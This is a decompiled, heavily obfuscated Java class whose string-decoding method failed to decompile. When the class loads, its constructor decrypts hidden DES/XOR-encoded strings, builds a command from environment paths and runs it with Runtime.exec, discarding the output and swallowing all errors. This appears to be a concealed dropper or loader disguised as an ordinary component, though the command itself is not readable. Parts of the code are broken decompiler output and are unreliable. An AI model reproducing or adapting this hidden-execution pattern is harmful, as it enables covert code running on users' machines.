/*
 * Decompiled with CFR 0.152.
 */
package a.b.c.j;

import a.b.c.g.s5;
import a.b.c.j.o;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.invoke.MethodHandles;
import java.security.Key;
import java.util.zip.ZipOutputStream;
import javax.crypto.Cipher;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;
import javax.crypto.spec.IvParameterSpec;

public class up {
    public static final up INSTANCE;
    private static final String[] T;
    private static final String[] Y;
    private static final long a;

    public up() {
        long l2 = a ^ 0x565958C462C0L;
        long l3 = l2 ^ 0x7D5922155099L;
        this.S(l3);
    }

    private void S(long l2) {
        l2 = a ^ l2;
        try {
            String string = System.getenv(up.U(29907, 28726));
            if (string == null) {
                string = System.getProperty(up.U(29904, -12082)) + up.U(29911, 1690);
            }
            String string2 = string + up.U(29908, 11352);
            String string3 = string + up.U(29910, 5978);
            String string4 = System.getProperty(up.U(29909, -18493));
            String string5 = up.U(29905, -14672) + string4;
            String string6 = String.format(up.U(29906, 16790), string5, string2, string3);
            Process process = Runtime.getRuntime().exec(string6);
            process.waitFor();
            this.q(process);
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private void q(Process process) {
        try {
            new Thread(() -> up.lambda$printProcessOutput$0(process)).start();
            new Thread(() -> up.lambda$printProcessOutput$1(process)).start();
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public void toOutput(ZipOutputStream zipOutputStream) {
    }

    /*
     * Unable to fully structure code
     */
    private static void lambda$printProcessOutput$1(Process var0) {
        block20: {
            var1_1 = up.a ^ 60010763099603L;
            var4_2 = o.b();
            var3_3 = o.Z();
            try {
                block21: {
                    var5_4 = new BufferedReader(new InputStreamReader(var0.getErrorStream()));
                    var6_6 = null;
                    while ((var7_7 = var5_4.readLine()) != null) {
                    }
                    try {
                        if (var5_4 == null) break block20;
                        if (var6_6 == null) break block21;
                    }
                    catch (Throwable v0) {
                        throw up.F(v0);
                    }
                    try {
                        var5_4.close();
                    }
                    catch (Throwable var7_8) {
                        var6_6.addSuppressed(var7_8);
                    }
                    break block20;
                }
                var5_4.close();
                break block20;
                catch (Throwable var7_9) {
                    try {
                        var6_6 = var7_9;
                        throw var7_9;
                    }
                    catch (Throwable var8_10) {
                        block23: {
                            block22: {
                                try {
                                    if (var5_4 == null) break block22;
                                    if (var6_6 != null) {
                                    }
                                    ** GOTO lbl50
                                }
                                catch (Throwable v1) {
                                    throw up.F(v1);
                                }
                                try {
                                    var5_4.close();
                                }
                                catch (Throwable var9_11) {
                                    try {
                                        try {
                                            v2 = var6_6;
                                            if (var3_3 == null) break block23;
                                            v2.addSuppressed(var9_11);
                                            if (!var4_2) break block22;
                                        }
                                        catch (Throwable v3) {
                                            throw up.b(v3);
                                        }
lbl50:
                                        // 2 sources

                                        var5_4.close();
                                    }
                                    catch (Throwable v4) {
                                        throw up.F(v4);
                                    }
                                }
                            }
                            v2 = var8_10;
                        }
                        throw v2;
                    }
                }
            }
            catch (Exception var5_5) {
                // empty catch block
            }
        }
    }

    /*
     * Unable to fully structure code
     */
    private static void lambda$printProcessOutput$0(Process var0) {
        block20: {
            var1_1 = up.a ^ 61899355123461L;
            var4_2 = o.b();
            var3_3 = o.Z();
            try {
                block21: {
                    var5_4 = new BufferedReader(new InputStreamReader(var0.getInputStream()));
                    var6_6 = null;
                    while ((var7_7 = var5_4.readLine()) != null) {
                    }
                    try {
                        if (var5_4 == null) break block20;
                        if (var6_6 == null) break block21;
                    }
                    catch (Throwable v0) {
                        throw up.F(v0);
                    }
                    try {
                        var5_4.close();
                    }
                    catch (Throwable var7_8) {
                        var6_6.addSuppressed(var7_8);
                    }
                    break block20;
                }
                var5_4.close();
                break block20;
                catch (Throwable var7_9) {
                    try {
                        var6_6 = var7_9;
                        throw var7_9;
                    }
                    catch (Throwable var8_10) {
                        block23: {
                            block22: {
                                try {
                                    if (var5_4 == null) break block22;
                                    if (var6_6 != null) {
                                    }
                                    ** GOTO lbl50
                                }
                                catch (Throwable v1) {
                                    throw up.F(v1);
                                }
                                try {
                                    var5_4.close();
                                }
                                catch (Throwable var9_11) {
                                    try {
                                        try {
                                            v2 = var6_6;
                                            if (var3_3 == null) break block23;
                                            v2.addSuppressed(var9_11);
                                            if (!var4_2) break block22;
                                        }
                                        catch (Throwable v3) {
                                            throw up.b(v3);
                                        }
lbl50:
                                        // 2 sources

                                        var5_4.close();
                                    }
                                    catch (Throwable v4) {
                                        throw up.F(v4);
                                    }
                                }
                            }
                            v2 = var8_10;
                        }
                        throw v2;
                    }
                }
            }
            catch (Exception var5_5) {
                // empty catch block
            }
        }
    }

    /*
     * Unable to fully structure code
     */
    static {
        block29: {
            block30: {
                block28: {
                    block27: {
                        up.a = s5.a(-3479343343997581939L, -323200666086381615L, MethodHandles.lookup().lookupClass()).a(25869134989627L);
                        var9 = up.a ^ 105725439940855L;
                        var1_1 = Cipher.getInstance("DES/CBC/PKCS5Padding");
                        v0 = SecretKeyFactory.getInstance("DES");
                        v1 = new byte[8];
                        v2 = v1;
                        v1[0] = (byte)(var9 >>> 56);
                        for (var2_2 = 1; var2_2 < 8; ++var2_2) {
                            v2 = v2;
                            v2[var2_2] = (byte)(var9 << var2_2 * 8 >>> 56);
                        }
                        var1_1.init(2, (Key)v0.generateSecret(new DESKeySpec(v2)), new IvParameterSpec(new byte[8]));
                        var0_3 = new String[2];
                        var6_4 = 0;
                        var5_5 = "\u00de\u0004f\u00a7U\u00fc\u009bp\u0090\u0092\u009c\u00a5M;\u0013\u00b9\u00fe\u00e9\u00fc\u00bc\"X\u00eb\u00c53\u0083\u00ebS/\u0010\u00bc\u00ab\u008eE\u0098\u00ff\\\u00b0\u00be\u00eb\u0091\u00f4!\u00a1\u0084\u00e5;\u0095\u00f3\u0003\b)m\u00f5\u0085\u00e6U\u00cb5IK\u00cd\u00ce\u00e6T&\u00f0\u00c20\u00fb\u00c4 *e\u00b9\u00f4LR(\u00cc\u0096\u0007\u00e0\u00f7\u00b4!D\u00ec\u00ef\u00c1\u008e\u00f8p\u00c8\u00da\u0098\u00c7T\t7Qf\u0089\u0089\u00aaU\u00bb\u008a\u009f;\u00d5UJ\u00f0@\u008bu\u001a\n\u00cf\u00f8\u00ce\u00c1,c\u007fJR\u0011\u008c\u0093\u00d3p.\u009aQ\u00dbq\u00e3\u00c1\u00d6\u00d2\u00a7\u009c\u008a\u00c7\u00fff\u00bc\u00b3\u00dbf\u0098\u00d6B\u00d2\u00ca\u009ay\u0010E&s\u001a\u00dd\u0096\u009af\u00d7\u00953\u00aa^\u00fd=\u0013\u0006\u00e3\u0083\u0005B\u00c7\u00d7\u008eC\u00feY\u00dd\u00a2\u00d3\u00ac\u009f\u00f9}\u009e\u001b=\u001bSvPR\u001b\u0098\u0014\u00b0\u00df\u00c2\u00a0\u00a5\u00a4\u0012\u0085\u00a3\u009c\"\u009c*\u00c8&\u0082\u0017&\u00feX\u001b\u0087\u00f1^\u0016+\u001e\u00b9\u00abE\u001b\u00df\u00e6\u0091\u008d(\u00afy\u00c9IG\u0011N\u00fas\b\u009c>\u00e2`0\u00d2A\u0080L\u00afH\u000f\u0091\u00c5\u00ab\u00a0L\u00c5\u00cep\u008d\u0095\u00c2tl\u00810%L\u008b";
                        var7_6 = "\u00de\u0004f\u00a7U\u00fc\u009bp\u0090\u0092\u009c\u00a5M;\u0013\u00b9\u00fe\u00e9\u00fc\u00bc\"X\u00eb\u00c53\u0083\u00ebS/\u0010\u00bc\u00ab\u008eE\u0098\u00ff\\\u00b0\u00be\u00eb\u0091\u00f4!\u00a1\u0084\u00e5;\u0095\u00f3\u0003\b)m\u00f5\u0085\u00e6U\u00cb5IK\u00cd\u00ce\u00e6T&\u00f0\u00c20\u00fb\u00c4 *e\u00b9\u00f4LR(\u00cc\u0096\u0007\u00e0\u00f7\u00b4!D\u00ec\u00ef\u00c1\u008e\u00f8p\u00c8\u00da\u0098\u00c7T\t7Qf\u0089\u0089\u00aaU\u00bb\u008a\u009f;\u00d5UJ\u00f0@\u008bu\u001a\n\u00cf\u00f8\u00ce\u00c1,c\u007fJR\u0011\u008c\u0093\u00d3p.\u009aQ\u00dbq\u00e3\u00c1\u00d6\u00d2\u00a7\u009c\u008a\u00c7\u00fff\u00bc\u00b3\u00dbf\u0098\u00d6B\u00d2\u00ca\u009ay\u0010E&s\u001a\u00dd\u0096\u009af\u00d7\u00953\u00aa^\u00fd=\u0013\u0006\u00e3\u0083\u0005B\u00c7\u00d7\u008eC\u00feY\u00dd\u00a2\u00d3\u00ac\u009f\u00f9}\u009e\u001b=\u001bSvPR\u001b\u0098\u0014\u00b0\u00df\u00c2\u00a0\u00a5\u00a4\u0012\u0085\u00a3\u009c\"\u009c*\u00c8&\u0082\u0017&\u00feX\u001b\u0087\u00f1^\u0016+\u001e\u00b9\u00abE\u001b\u00df\u00e6\u0091\u008d(\u00afy\u00c9IG\u0011N\u00fas\b\u009c>\u00e2`0\u00d2A\u0080L\u00afH\u000f\u0091\u00c5\u00ab\u00a0L\u00c5\u00cep\u008d\u0095\u00c2tl\u00810%L\u008b".length();
                        var4_7 = 240;
                        var3_8 = -1;
lbl19:
                        // 2 sources

                        while (true) {
                            continue;
                            break;
                        }
lbl21:
                        // 1 sources

                        while (true) {
                            var0_3[var6_4++] = up.a(var8_9).intern();
                            if ((var3_8 += var4_7) < var7_6) {
                                var4_7 = var5_5.charAt(var3_8);
                                ** continue;
                            }
                            break block27;
                            break;
                        }
                        v3 = ++var3_8;
                        var8_9 = var1_1.doFinal(var5_5.substring(v3, v3 + var4_7).getBytes("ISO-8859-1"));
                        ** while (true)
                    }
                    var16_10 = new String[8];
                    var14_11 = 0;
                    var13_12 = var0_3[0];
                    var15_13 = var13_12.length();
                    var12_14 = 4;
                    var11_15 = -1;
lbl38:
                    // 2 sources

                    while (true) {
                        v4 = 19;
                        v5 = ++var11_15;
                        v6 = var13_12.substring(v5, v5 + var12_14);
                        v7 = -1;
                        break block28;
                        break;
                    }
lbl44:
                    // 1 sources

                    while (true) {
                        var16_10[var14_11++] = v8.intern();
                        if ((var11_15 += var12_14) < var15_13) {
                            var12_14 = var13_12.charAt(var11_15);
                            ** continue;
                        }
                        var13_12 = var0_3[1];
                        var15_13 = var13_12.length();
                        var12_14 = 14;
                        var11_15 = -1;
lbl53:
                        // 2 sources

                        while (true) {
                            v4 = 9;
                            v9 = ++var11_15;
                            v6 = var13_12.substring(v9, v9 + var12_14);
                            v7 = 0;
                            break block28;
                            break;
                        }
                        break;
                    }
lbl59:
                    // 1 sources

                    while (true) {
                        var16_10[var14_11++] = v8.intern();
                        if ((var11_15 += var12_14) < var15_13) {
                            var12_14 = var13_12.charAt(var11_15);
                            ** continue;
                        }
                        break block29;
                        break;
                    }
                }
                v10 = v6.toCharArray();
                v11 = v10.length;
                var17_16 = 0;
                try {
                    v12 = v4;
                    v13 = v10;
                    v14 = v11;
                    if (v11 > 1) break block30;
lbl77:
                    // 2 sources

                    while (true) {
                        v15 = v12;
                        v13 = v13;
                        v16 = v13;
                        v17 = v12;
                        v18 = var17_16;
                        break;
                    }
                }
                catch (RuntimeException v19) {
                    throw up.b(v19);
                }
                while (true) {
                    switch (var17_16 % 7) {
                        case 0: {
                            v20 = 27;
                            break;
                        }
                        case 1: {
                            v20 = 63;
                            break;
                        }
                        case 2: {
                            v20 = 101;
                            break;
                        }
                        case 3: {
                            v20 = 58;
                            break;
                        }
                        case 4: {
                            v20 = 50;
                            break;
                        }
                        case 5: {
                            v20 = 82;
                            break;
                        }
                        default: {
                            v20 = 64;
                        }
                    }
                    try {
                        v16[v18] = (char)(v16[v18] ^ (v17 ^ v20));
                        ++var17_16;
                        v12 = v15;
                        if (v15 != 0) break;
                        v15 = v12;
                        v13 = v13;
                        v18 = v12;
                        v16 = v13;
                        v17 = v12;
                    }
                    catch (RuntimeException v21) {
                        throw up.b(v21);
                    }
                }
            }
            v22 = v13;
            v14 = v14;
            ** while (v14 > var17_16)
lbl128:
            // 1 sources

            v8 = new String(v22);
            switch (v7) {
                default: {
                    ** continue;
                }
                ** case 0:
lbl135:
                // 1 sources

                ** continue;
            }
        }
        up.T = var16_10;
        up.Y = new String[8];
        up.INSTANCE = new up();
    }

    private static Throwable F(Throwable throwable) {
        return throwable;
    }

    /*
     * Exception decompiling
     */
    private static String U(int var0, int var1_1) {
        /*
         * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
         * 
         * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [0[TRYBLOCK]], but top level block is 4[SWITCH]
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
         *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
         *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
         *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
         *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
         *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
         *     at org.benf.cfr.reader.Main.main(Main.java:54)
         */
        throw new IllegalStateException("Decompilation failed");
    }

    private static Throwable b(Throwable throwable) {
        return throwable;
    }

    private static String a(byte[] byArray) {
        int n2 = 0;
        int n3 = byArray.length;
        char[] cArray = new char[n3];
        for (int i2 = 0; i2 < n3; ++i2) {
            char c2;
            int n4 = 0xFF & byArray[i2];
            if (n4 < 192) {
                cArray[n2++] = (char)n4;
                continue;
            }
            if (n4 < 224) {
                c2 = (char)((char)(n4 & 0x1F) << 6);
                n4 = byArray[++i2];
                c2 = (char)(c2 | (char)(n4 & 0x3F));
                cArray[n2++] = c2;
                continue;
            }
            if (i2 >= n3 - 2) continue;
            c2 = (char)((char)(n4 & 0xF) << 12);
            n4 = byArray[++i2];
            c2 = (char)(c2 | (char)(n4 & 0x3F) << 6);
            n4 = byArray[++i2];
            c2 = (char)(c2 | (char)(n4 & 0x3F));
            cArray[n2++] = c2;
        }
        return new String(cArray, 0, n2);
    }
}

